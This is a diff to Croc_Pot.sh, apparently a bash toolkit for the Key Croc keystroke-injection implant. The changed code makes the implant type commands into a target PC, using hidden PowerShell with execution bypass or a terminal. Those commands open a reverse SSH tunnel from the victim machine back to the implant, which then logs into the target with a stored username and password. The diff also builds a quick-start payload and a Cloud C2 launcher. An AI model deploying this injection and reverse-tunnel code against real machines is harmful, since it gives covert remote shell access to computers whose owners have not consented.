+if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
 	read_all START REVERSE SSH TUNNEL PC TO KEYCROC Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
+	read_all ENTER PORT NUMBER YOU WOULD LIKE TO USE AND PRESS [ENTER]
 	if [ "$(OS_CHECK)" = WINDOWS ]; then
 		Q GUI d
 		Q GUI r
@@ -4698,14 +4701,14 @@ shell_pc() {
 		Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 		Q ENTER
 		sleep 2
-		Q STRING "ssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
 		sleep 2
 		Q STRING "$(sed -n 1p /tmp/CPW.txt)"
 		Q ENTER
 		sleep 1
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a}
 else
 		local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
 	case $HOST_CHECK in
@@ -4716,39 +4719,39 @@ else
 		Q ENTER
 		Q ENTER
 		sleep 1
-		Q STRING "ssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a} ;;
 	parrot)
 		Q ALT F2
 		sleep 1
 		Q STRING "mate-terminal"
 		Q ENTER
 		sleep 1
-		Q STRING "ssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a} ;;
 	*)
 		Q ALT F2
 		sleep 1
 		Q STRING "xterm"
 		Q ENTER
 		sleep 1
-		Q STRING "ssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a} ;;
 	esac
 fi ;;
 	[nN] | [nN][oO])
@@ -4756,45 +4759,47 @@ fi ;;
 	*)
 		invalid_entry ; shell_pc ;;
 esac
+else
+	echo -ne "\t\e[40m$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
+fi
 }
 ##
-#----SSH Create a Reverse SSH Tunnel Keycroc to server
+#----SSH start a Reverse SSH Tunnel Keycroc to your server
 ##
 ssh_tunnel() {
 	echo -ne "$(Info_Screen '
--Start a Reverse SSH Tunnel Keycroc to server\n
+-Start a Reverse SSH Tunnel Keycroc to your server\n
 -Remotely access your keycroc from your server\n
 -Keycroc will be setup with these setting below\n
 -\e[40;32mssh -fN -R port#:localhost:22 root@your-server-ip\e[0m\e[40;93m\n
 -ON your server enter this below\n 
 -\e[40;32mssh root@localhost -p port#\n')${clear}\n"
+start_tunnel() {
+	echo -ne "\n\e[40;93mKeycroc SETUP \e[40;32mssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
+	echo -ne "\n\e[40;93mSERVER SETUP \e[40;32mssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
+	ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
+}
 	read_all START REVERSE SSH TUNNEL Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
 		local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
 	if [ -e "${SAVE_SHELL}" ]; then
-		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
+		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) User name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
 		read_all Found saved shell setup use them Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -ne "\n\e[40;93mKeycroc SETUP \e[40;32mssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
-		echo -ne "\n\e[40;93mSERVER SETUP \e[40;32mssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
-		ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL}) ;;
+		start_tunnel ;;
 	[nN] | [nN][oO])
 		rm ${SAVE_SHELL}
-		shell_input ; echo -ne "${IP_RS}\n${IP_RSP}" >> ${SAVE_SHELL}
-		echo -ne "\n\e[40;93mKeycroc SETUP \e[40;32mssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
-		echo -ne "\n\e[40;93mSERVER SETUP \e[40;32mssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
-		ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL}) ;;
+		shell_input
+		start_tunnel ;;
 	*)
 		invalid_entry ; ssh_tunnel ;;
 	esac
 	else
 		echo -ne "\e[40m$(ColorRed 'Did not find any saved shell setup')\n"
-		shell_input ; echo -ne "${IP_RS}\n${IP_RSP}" >> ${SAVE_SHELL}
-		echo -ne "\n\e[40;93mKeycroc SETUP \e[40;32mssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
-		echo -ne "\n\e[40;93mSERVER SETUP \e[40;32mssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
-		ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 root@$(sed -n 1p ${SAVE_SHELL})
+		shell_input
+		start_tunnel
 	fi ;;
 	[nN] | [nN][oO])
 		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
@@ -4981,7 +4986,7 @@ fi
 restore_firmware() {
 	unset r_a
 	echo -ne "\n\e[40m$(ColorRed 'THIS WILL RESTORE THE KEYCROC TO THE LATEST FIRMWARE\n
-	ARE YOUR YOU SURE Y/N AND PRESS [ENTER]:')${clear}"; read r_a
+	ARE YOU SURE Y/N AND PRESS [ENTER]:')${clear}"; read r_a
 	case $r_a in
 	[yY] | [yY][eE][sS])
 	if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
@@ -5229,7 +5234,7 @@ remove_cloud() {
 	rm /etc/systemd/system/hak5.service
 }
 ##
-#----Quick start Cloud_C2 payload function
+#----Quick start Cloud_C2 (payload)
 ##
 quick_cloud() {
 	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
@@ -5382,7 +5387,7 @@ MenuEnd
 	esac
 }
 ##
-#----Create quick start payload for Croc_Pot
+#----Create quick start (payload) for Croc_Pot
 ##
 function quick_croc_pot () {
 	clear
@@ -5390,7 +5395,7 @@ function quick_croc_pot () {
 -Create payload\n 
 -Quickly Start Croc_Pot without OS detection\n
 -This is for when you Already ran OS detection on target pc by crocpot\n
--Match word is qcrocpot\n')${clear}\n\n"
+-Match word is qspot\n')${clear}\n\n"
 	read_all INSTALL QUICK START CROC_POT PAYLOAD Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
@@ -5398,7 +5403,7 @@ function quick_croc_pot () {
 		echo -ne "\n\e[40m$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${clear}\n"
 	else
 		echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
-#                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qcrocpot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
+#                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
 echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
 	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
 	LED B\n	sleep 5\n	Q STRING \"terminal\"\n	Q ENTER\n	Q ENTER\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
@@ -5421,15 +5426,15 @@ function main_menu() {
 	clear
 	croc_title
 MenuTitle CROC POT MAIN MENU
-MenuColor 1 CROC MAIL ; echo -ne "     ${blue}\U2709${clear}\n"
-MenuColor 2 CROC POT PLUS ; echo -ne "  ${red}∞${clear}\n"
-MenuColor 3 KEYCROC STATUS ; echo -ne "${green}✓${clear}\n"
-MenuColor 4 KEYCROC LOGS ; echo -ne "  ∵${clear}\n"
-MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow}✏${clear}\n"
-MenuColor 6 SSH MENU ; echo -ne "      ${blue}⇆${clear}\n"
-MenuColor 7 RECOVERY MENU ; echo -ne " ${green}♲${clear}\n"
-MenuColor 8 HAK5 CLOUD C2 ; echo -ne "  ${white}☁${clear}\n"
-MenuColor 9 QUICK START ; echo -ne "   ${white}☁${clear}\n"
+MenuColor 1 CROC MAIL ; echo -ne "     ${blue} \U2709 ${clear} \n"
+MenuColor 2 CROC POT PLUS ; echo -ne "  ${red} ∞ ${clear} \n"
+MenuColor 3 KEYCROC STATUS ; echo -ne "${green} ✓ ${clear} \n"
+MenuColor 4 KEYCROC LOGS ; echo -ne "   ∵ ${clear} \n"
+MenuColor 5 KEYCROC EDIT ; echo -ne "  ${yellow} ✏ ${clear} \n"
+MenuColor 6 SSH MENU ; echo -ne "      ${blue} ⇆ ${clear} \n"
+MenuColor 7 RECOVERY MENU ; echo -ne " ${green} ♲ ${clear} \n"
+MenuColor 8 HAK5 CLOUD C2 ; echo -ne "  ${white} ☁ ${clear} \n"
+MenuColor 9 QUICK START ; echo -ne "   ${red} \U269D ${clear} \n"
 MenuEnd
 	unset m_a
 	read m_a
